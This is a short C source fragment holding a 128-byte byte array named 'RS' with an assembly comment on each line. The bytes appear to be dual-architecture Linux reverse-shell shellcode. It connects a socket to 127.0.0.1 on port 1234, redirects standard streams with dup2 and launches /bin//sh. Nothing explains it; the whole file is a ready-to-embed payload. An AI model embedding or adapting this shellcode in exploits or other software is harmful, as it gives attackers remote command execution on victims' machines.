
#define RS_SIZE 128

char RS[] = {
  /* 0000 */ "\xcc"                         /* int3                            */
  /* 0001 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
  /* 0006 */ "\xba\x80\xff\xff\xfe"         /* mov edx, 0xfeffff80             */
  /* 000B */ "\xf7\xd1"                     /* not ecx                         */
  /* 000D */ "\xf7\xd2"                     /* not edx                         */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x50"                         /* push rax                        */
  /* 0011 */ "\x89\x0c\x24"                 /* mov [rsp], ecx                  */
  /* 0014 */ "\x89\x54\x24\x04"             /* mov [rsp+0x4], edx              */
  /* 0018 */ "\x6a\x10"                     /* push 0x10                       */
  /* 001A */ "\x54"                         /* push rsp                        */
  /* 001B */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 001D */ "\x99"                         /* cdq                             */
  /* 001E */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 0020 */ "\x6a\x01"                     /* push 0x1                        */
  /* 0022 */ "\x5e"                         /* pop rsi                         */
  /* 0023 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0025 */ "\x5f"                         /* pop rdi                         */
  /* 0026 */ "\x48\x75\x17"                 /* jnz 0x40                        */
  /* 0029 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 002B */ "\x0f\x05"                     /* syscall                         */
  /* 002D */ "\x97"                         /* xchg edi, eax                   */
  /* 002E */ "\x96"                         /* xchg esi, eax                   */
  /* 002F */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 0031 */ "\x0f\x05"                     /* syscall                         */
  /* 0033 */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
  /* 0036 */ "\x79\xf7"                     /* jns 0x2f                        */
  /* 0038 */ "\x5e"                         /* pop rsi                         */
  /* 0039 */ "\x5a"                         /* pop rdx                         */
  /* 003A */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 003C */ "\x0f\x05"                     /* syscall                         */
  /* 003E */ "\xeb\x1e"                     /* jmp 0x5e                        */
  /* 0040 */ "\x56"                         /* push rsi                        */
  /* 0041 */ "\x5b"                         /* pop rbx                         */
  /* 0042 */ "\x52"                         /* push rdx                        */
  /* 0043 */ "\x53"                         /* push rbx                        */
  /* 0044 */ "\x57"                         /* push rdi                        */
  /* 0045 */ "\x54"                         /* push rsp                        */
  /* 0046 */ "\x59"                         /* pop rcx                         */
  /* 0047 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0049 */ "\x93"                         /* xchg ebx, eax                   */
  /* 004A */ "\x59"                         /* pop rcx                         */
  /* 004B */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004D */ "\xcd\x80"                     /* int 0x80                        */
  /* 004F */ "\x49\x79\xf9"                 /* jns 0x4b                        */
  /* 0052 */ "\x58"                         /* pop rax                         */
  /* 0053 */ "\x58"                         /* pop rax                         */
  /* 0054 */ "\x53"                         /* push rbx                        */
  /* 0055 */ "\x54"                         /* push rsp                        */
  /* 0056 */ "\x59"                         /* pop rcx                         */
  /* 0057 */ "\x6a\x03"                     /* push 0x3                        */
  /* 0059 */ "\x5b"                         /* pop rbx                         */
  /* 005A */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005C */ "\xcd\x80"                     /* int 0x80                        */
  /* 005E */ "\x99"                         /* cdq                             */
  /* 005F */ "\x50"                         /* push rax                        */
  /* 0060 */ "\x50"                         /* push rax                        */
  /* 0061 */ "\x50"                         /* push rax                        */
  /* 0062 */ "\x54"                         /* push rsp                        */
  /* 0063 */ "\x5b"                         /* pop rbx                         */
  /* 0064 */ "\x53"                         /* push rbx                        */
  /* 0065 */ "\x5f"                         /* pop rdi                         */
  /* 0066 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 006C */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0073 */ "\x40\x75\x04"                 /* jnz 0x7a                        */
  /* 0076 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0078 */ "\x0f\x05"                     /* syscall                         */
  /* 007A */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 007C */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 007E */ "\xcd\x80"                     /* int 0x80                        */
};